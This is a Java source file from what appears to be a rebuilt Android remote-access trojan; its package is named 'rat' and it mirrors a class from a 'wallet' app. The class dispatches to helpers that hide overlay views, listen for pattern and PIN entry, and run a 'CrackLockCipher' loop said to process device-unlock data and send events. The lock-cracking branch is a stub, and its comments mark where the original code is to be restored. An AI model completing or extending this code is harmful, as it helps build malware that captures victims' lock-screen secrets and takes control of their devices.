package com.vendor.rat.helper;

import android.util.Log;

/**
 * Vendor: com.guard.wallet.helper.f
 * Multi-purpose Runnable dispatching various helper operations.
 * mode 0: BlockViewHelper.removeViewSimple
 * mode 1: BlockViewHelper.removeViewInternal
 * mode 2: PatternListenHelper.removeView
 * mode 3: PatternListenHelper.removeView
 * mode 4: PinListenHelper.removeView
 * mode 5: CrackLockCipher polling loop
 * default: AccessibilityUtils dialog operations
 */
public final class HelperRunnable implements Runnable {

    public final int mode;

    public HelperRunnable() {
        this(5);
        // ADAPT: vendor default constructor sets mode=5
    }

    public HelperRunnable(int mode) {
        this.mode = mode;
    }

    @Override
    public final void run() {
        switch (this.mode) {
            case 0:
                BlockViewHelper.removeViewSimple();
                return;
            case 1:
                BlockViewHelper.removeViewInternal();
                return;
            case 2:
                PatternListenHelper.removeView();
                return;
            case 3:
                PatternListenHelper.removeView();
                return;
            case 4:
                PinListenHelper.removeView();
                return;
            case 5:
                // ADAPT: vendor implements CrackLockCipher polling loop
                // Checks thread pool status, processes unlock device data,
                // sends events, and reschedules if not complete
                // TODO: VENDOR_VERIFY - full polling implementation
                Log.d("HelperRunnable", "CrackLockCipher polling mode");
                return;
            default:
                // ADAPT: vendor calls utils.b.a() and utils.b.f()
                Log.d("HelperRunnable", "default mode - accessibility dialog ops");
                return;
        }
    }
}
